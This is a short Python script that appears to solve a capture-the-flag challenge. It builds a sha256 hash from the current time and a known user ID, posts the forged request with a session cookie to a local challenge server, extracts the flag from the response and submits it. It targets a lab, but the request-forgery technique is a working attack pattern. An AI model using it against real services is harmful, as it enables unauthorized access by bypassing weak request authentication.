import time
import requests
from hashlib import sha256

cookies = {"user": "f812b4f6-550b-44f2-a656-8cb563a21c51"} # Cookie taken from the website under my user

curr_time = int(time.time())
user_id = "SuperSecureUser"

hashed_time = (str(curr_time) + user_id).encode('utf-8')
payload = {
    'time': str(curr_time),
    'hash': sha256(hashed_time).hexdigest(),
    'userID': user_id,
    'imagePath': 'secure_image.png'
}

headers = {
    'Content-Type': 'application/json'
}

response = requests.post("http://127.0.0.1:8000/games/more_random_text/super_secure_request", headers=headers, json=payload, cookies=cookies)

print(response.text)
flag = response.text.split(" ")[-1][:-1]

payload = {
    "flag": flag
}

print(flag)

response = requests.post("http://127.0.0.1:8000/games/more_random_text/verify", headers=headers, json=payload, cookies=cookies)

print(response)
print(response, response.text)